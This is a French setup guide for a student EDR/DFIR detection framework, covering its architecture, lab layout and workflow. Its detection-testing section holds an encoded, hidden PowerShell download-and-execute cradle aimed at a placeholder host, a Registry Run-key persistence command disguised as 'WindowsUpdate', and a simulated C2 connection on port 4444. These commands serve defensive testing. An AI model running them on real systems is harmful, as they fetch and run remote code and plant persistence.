# Guide Complet : Architecture, Environnement & Démarrage de Zéro

## 1. Architecture du Projet (Vue d'Ensemble)

```
┌──────────────────────────────────────────────────────────────────────────┐
│                        LIGHT EDR FRAMEWORK                               │
│                                                                          │
│  ┌─────────────┐    ┌──────────────┐    ┌────────────┐    ┌───────────┐ │
│  │  COLLECTE   │───►│  DÉTECTION   │───►│   MITRE    │───►│ RAPPORTS  │ │
│  │  D'ARTEFACTS│    │  YARA/Sigma  │    │   ATT&CK   │    │ Dashboard │ │
│  └──────┬──────┘    │  IOC/Heurist │    └─────┬──────┘    └─────┬─────┘ │
│         │           └──────┬───────┘          │               │       │
│         ▼                  ▼                  ▼               ▼       │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │                     SQLite Database (lightedr.db)                 │  │
│  │    Tables: hosts, scan_sessions, processes, network_connections,  │  │
│  │    event_logs, registry_keys, scheduled_tasks, alerts, reports    │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │              FastAPI Web Server (port 8000)                       │  │
│  │    Routes: / (dashboard), /hosts, /investigations, /mitre,       │  │
│  │            /reports, /alerts, /api/*                              │  │
│  └──────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

### Les 4 modules principaux

| Module | Rôle | Technologie |
|--------|------|-------------|
| **Collector** | Récupère les données du système (processus, réseau, registry...) | Python + psutil + wevtutil |
| **Detection** | Applique les règles YARA/Sigma/IOC + heuristiques | yara-python, Sigma rules |
| **MITRE** | Mappe les alertes aux techniques ATT&CK | techniques.json + mapper |
| **Reporting** | Dashboard web + rapports d'investigation | FastAPI + Jinja2 + Chart.js |

---

## 2. Structure des Dossiers (Ce que chaque dossier contient)

```
DFIR/
├── app/                    # Code source principal
│   ├── api/routes/        # Routes FastAPI (dashboard, alerts, hosts...)
│   ├── collector/         # 7 collecteurs d'artefacts système
│   ├── core/              # Configuration, logging, risk scoring
│   ├── database/          # Modèles SQLAlchemy + connexion SQLite
│   ├── detection/         # Moteurs YARA, Sigma, IOC, Heuristique
│   ├── mitre/             # Mapping MITRE ATT&CK + techniques.json
│   ├── reporting/         # Générateur de rapports + timeline
│   └── templates/         # Pages HTML du dashboard
├── rules/                 # Règles de détection
│   ├── yara/              # Fichiers .yar pour YARA
│   ├── sigma/             # Fichiers .yml pour Sigma
│   └── iocs/              # hashes.txt, ips.txt, domains.txt
├── static/                # CSS + JavaScript du dashboard
├── config.yaml            # Configuration du framework
├── requirements.txt       # Dépendances Python
├── run.py                 # Point d'entrée (scan + serveur)
├── setup_db.py            # Initialisation de la base
└── lightedr.db            # Base SQLite (générée automatiquement)
```

---

## 3. Environnement de Travail Recommandé

### Configuration Minimale

```
Machine physique (ton PC) — Windows 10/11
├── Python 3.12+                    ← DÉJÀ INSTALLÉ ✅
├── VS Code                         ← DÉJÀ INSTALLÉ ✅
├── Git                             
├── VMware Workstation (optionnel)  ← Pour le lab complet
└── 8 Go RAM minimum
```

### Architecture du Lab Complet (Pour impressionner l'encadrant)

```
┌──────────────────────────────────────────────────────────┐
│                    VMware Workstation                     │
│                    Réseau: 192.168.100.0/24               │
├──────────────────┬──────────────────┬────────────────────┤
│   Kali Linux     │   Windows 11     │    Ubuntu 22.04    │
│   192.168.100.10 │   192.168.100.20 │    192.168.100.30  │
│                  │                  │                    │
│  Rôle: Attaquant │  Rôle: Cible     │  Rôle: Analyse     │
│  Outils: metasploit,│  Sysmon +     │  Framework DFIR    │
│  powershell, etc  │  Collector Agent│  FastAPI + SQLite  │
└──────────────────┴──────────────────┴────────────────────┘
```

**Scénario :** Kali attaque Windows → Windows collecte les artefacts → Ubuntu analyse et dashboard

---

## 4. Guide Pas à Pas : De Zéro à un Scan Fonctionnel

### Étape 0 : Prérequis (5 min)

```powershell
# Vérifie que Python est installé
python --version
# Doit afficher: Python 3.12+

# Vérifie que pip est à jour
python -m pip install --upgrade pip
```

### Étape 1 : Activer l'environnement virtuel (2 min)

```powershell
cd C:\Users\Dell\Downloads\DFIR
.\venv\Scripts\activate
# Tu devrais voir (venv) apparaître devant le chemin
```

Si tu vois une erreur de droits d'exécution :
```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

### Étape 2 : Tout installer (5 min)

```powershell
pip install -r requirements.txt
# Attends la fin de l'installation
```

### Étape 3 : Initialiser la base de données (1 min)

```powershell
python setup_db.py
# Affiche: "Successfully created all database tables!"
```

### Étape 4 : Lancer un scan (30 sec)

```powershell
python run.py --scan
```

**Ce qui va se passer :**
1. Le framework détecte ton hostname (ex: `JOY-BOY`)
2. Les 7 collecteurs tournent (processus, réseau, eventlog...)
3. ~1400 artefacts sont collectés et sauvés en SQLite
4. Les moteurs YARA/Sigma/IOC scannent les données
5. Résultat affiché dans un tableau récapitulatif

### Étape 5 : Lancer le serveur web (5 sec)

```powershell
python run.py
# Puis ouvre http://127.0.0.1:8000/ dans ton navigateur
```

### Étape 6 : Explorer le dashboard

Dans le navigateur :
- **http://127.0.0.1:8000/** → Dashboard principal (stats temps réel)
- **http://127.0.0.1:8000/hosts** → Ta machine listée
- **http://127.0.0.1:8000/investigations** → Les sessions de scan
- **http://127.0.0.1:8000/investigations/1** → Détail des artefacts collectés
- **http://127.0.0.1:8000/mitre** → Grille MITRE ATT&CK
- **http://127.0.0.1:8000/reports** → Génération de rapports

---

## 5. Cycle de Travail Quotidien

```
1. Activer le venv         → .\venv\Scripts\activate
2. Lancer un scan          → python run.py --scan
3. Lancer le serveur       → python run.py
4. Voir les résultats      → http://127.0.0.1:8000/
5. Modifier du code        → Dans VS Code (le serveur se recharge si --debug)
6. Re-tester               → Retour à l'étape 2
```

---

## 6. Comment Tester la Détection (Simulation d'Attaque)

### Test A : PowerShell malveillant
```powershell
# Ouvre un terminal PowerShell et exécute :
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkA
```

### Test B : Persistance via Registry
```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\Windows\Temp\update.exe"
```

### Test C : Connexion C2 simulée
```powershell
# Ouvre une connexion vers une IP de test
Test-NetConnection 185.130.5.10 -Port 4444
```

### Vérification
```powershell
python run.py --scan
# Va voir /investigations/{id} dans le dashboard
```

---

## 7. Commandes Essentielles à Retenir

| Action | Commande |
|--------|----------|
| Activer l'environnement | `.\venv\Scripts\activate` |
| Lancer un scan | `python run.py --scan` |
| Lancer le serveur | `python run.py` |
| Réinitialiser la DB | `rm lightedr.db; python setup_db.py` |
| Installer une dépendance | `pip install <package>` |
| Voir la DB | `python -c "from app.database.database import SessionLocal; print(SessionLocal().execute('SELECT COUNT(*) FROM processes').scalar())"` |

---

## 8. Prochaines Étapes (Ce Que Ton Encadrant Veut Voir)

1. **Scanner ta machine** → montrer le dashboard avec TES données
2. **Simuler une attaque** → montrer les ALERTES dans le dashboard
3. **Générer un rapport** → montrer un PDF d'investigation
4. **Expliquer la kill chain** → "Voici comment l'attaque a été détectée : PowerShell → Registry → C2"
5. **Montrer le mapping MITRE** → "Cette alerte correspond à T1059.001 (Execution)"

---

## 9. Résolution des Problèmes Courants

| Problème | Solution |
|----------|----------|
| "Module not found" | `pip install -r requirements.txt` |
| "Permission denied" | Lancer PowerShell en Administrateur |
| "Port already in use" | `python run.py --port 8001` |
| Processus Python bloqué | `taskkill /F /IM python.exe` |
| Base corrompue | `Remove-Item lightedr.db; python setup_db.py` |
| YARA ne compile pas | `pip install yara-python==4.5.4` (version pré-compilée) |
